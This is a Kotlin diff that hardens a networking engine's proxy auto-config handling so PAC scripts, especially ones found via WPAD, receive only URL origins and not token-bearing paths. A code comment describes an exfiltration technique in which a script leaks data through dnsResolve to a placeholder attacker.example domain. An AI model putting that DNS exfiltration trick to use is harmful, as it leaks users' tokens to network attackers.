@@ -61,8 +61,10 @@ public object ProxyResolvers {
      * WPAD when they say "auto discover"; the script downloaded by the engine and run on JavaScriptCore, sandboxed and
      * time-limited) and on Windows by WinHTTP (automatic detection, WPAD, or a PAC URL, `WinHttpGetProxyForUrl`); a
      * lookup waits for it at most 5 seconds (on Windows a WinHTTP call still running then is left to end on its own, and
-     * its answer is dropped). For a WebSocket the script gets the `ws://` or `wss://` URI with the resource name (RFC
-     * 6455 section 4.1), for anything else `http://` or `https://`, host and port. A script that cannot be fetched or run
+     * its answer is dropped). The script gets a `ws://` URI whole, with its resource name (RFC 6455 section 4.1), and
+     * for `wss`, `https` and `http` the origin only (`wss://host[:port]/`), as browsers give it: a script from WPAD could
+     * send a path's tokens out; `KuicksilverEngineConfig.pacFullWebSocketUrl` gives the settings' own script (never
+     * WPAD's) a `wss://` URI whole. A script that cannot be fetched or run
      * in that time means the next setting (on Windows the fixed proxy, if any) or a direct connection, and the engine
      * logs one warning. On Windows a WPAD detection that found no script is remembered for 5 minutes (detection is not
      * run again in that time).
@@ -78,6 +80,16 @@ internal interface WarningProxyResolver : ProxyResolver {
     ): ResolvedProxy?
 
     override suspend fun proxyFor(url: Url): ResolvedProxy? = proxyFor(url) {}
+
+    /**
+     * [proxyFor] where a PAC script the settings name (a PAC URL or the script, never one WPAD found) gets a `wss` URL
+     * whole when [pacFullWebSocketUrl] (`KuicksilverEngineConfig.pacFullWebSocketUrl`); see [pacTarget].
+     */
+    suspend fun proxyFor(
+        url: Url,
+        warn: (String) -> Unit,
+        pacFullWebSocketUrl: Boolean,
+    ): ResolvedProxy? = proxyFor(url, warn)
 }
 
 /** The platform's `System` resolver. */
@@ -577,17 +589,40 @@ internal const val PAC_FAILED: String =
 internal const val PAC_TIMEOUT_MILLIS: Long = 5_000
 
 /**
- * The URI a PAC script's `FindProxyForURL` gets for [url]: for a WebSocket the `ws://` or `wss://` URI from its host,
- * port and resource name (RFC 6455 section 4.1: "the URI to pass the function MUST be constructed from /host/, /port/,
- * /resource name/, and the /secure/ flag using the definition of a WebSocket URI"), else the scheme, host and port
- * (the path is left out, as the answers are kept per scheme, host and port, and as browsers do for `https`).
+ * The URI a PAC script's `FindProxyForURL` gets for [url], as Chromium builds it (net/docs/proxy.md; its URL
+ * sanitizer): no user info or fragment, the host in lower case, a default port left out.
+ * - `https` and `wss` (secure): the origin only, `scheme://host[:port]/`. A script can send what it is given out through
+ *   `dnsResolve("<data>.attacker.example")`, and a script found by WPAD, or fetched from a plain-http PAC URL, is code
+ *   from whoever controls the local network: a path or query with a token would leak (CVE-2016-3763 in Android,
+ *   CVE-2016-5134 in Chrome; both have sent the origin only since 2016, and Firefox strips the path by default).
+ * - `ws`: the whole WebSocket URI with its resource name (RFC 6455 section 4.1: "the URI to pass the function MUST be
+ *   constructed from /host/, /port/, /resource name/, and the /secure/ flag using the definition of a WebSocket URI").
+ *   Chromium and Android keep the path of plain URLs too; whoever can serve the script can read them on the wire anyway.
+ * - `wss` with [fullWebSocketUrl]: the whole URI too. Callers pass it only for a script the settings name (a PAC URL or
+ *   the script itself), never for one WPAD found (`KuicksilverEngineConfig.pacFullWebSocketUrl`).
+ * - `http`: the origin only, `http://host[:port]/` (the engine keeps answers per scheme, host and port).
  */
-internal fun pacTarget(url: Url): String {
-    val host = uriHost(socketHost(url.host))
-    return when (url.protocol.name) {
-        "ws", "wss" -> "${url.protocol.name}://$host:${url.port}${url.encodedPathAndQuery.ifEmpty { "/" }}"
-        else -> "${if (url.protocol.isSecure()) "https" else "http"}://$host:${url.port}/"
-    }
+internal fun pacTarget(
+    url: Url,
+    fullWebSocketUrl: Boolean = false,
+): String {
+    val webSocket = url.protocol.name == "ws" || url.protocol.name == "wss"
+    val secure = url.protocol.isSecure()
+    val scheme =
+        when {
+            webSocket -> url.protocol.name
+            secure -> "https"
+            else -> "http"
+        }
+    val port = if (url.port == (if (secure) 443 else 80)) "" else ":${url.port}"
+    val authority = uriHost(socketHost(url.host).lowercase()) + port
+    val resource =
+        if (webSocket && (!secure || fullWebSocketUrl)) {
+            url.encodedPathAndQuery.let { if (it.startsWith('/')) it else "/$it" }
+        } else {
+            "/"
+        }
+    return "$scheme://$authority$resource"
 }
 
 /** What Windows' PAC evaluation gave: a proxy list as WinINet writes it, a direct connection, or no answer. */
@@ -735,7 +770,11 @@ internal class ProxyRouting(
             return lock.withLock {
                 inFlight[key]?.takeUnless { it.isCompleted } ?: kotlinx.coroutines.GlobalScope
                     .async(resolverDispatcher) {
-                        if (resolver is WarningProxyResolver) resolver.proxyFor(url, ::warnOnce) else resolver.proxyFor(url)
+                        if (resolver is WarningProxyResolver) {
+                            resolver.proxyFor(url, ::warnOnce, config.pacFullWebSocketUrl)
+                        } else {
+                            resolver.proxyFor(url)
+                        }
                     }.also { d ->
                         started = true
                         inFlight[key] = d
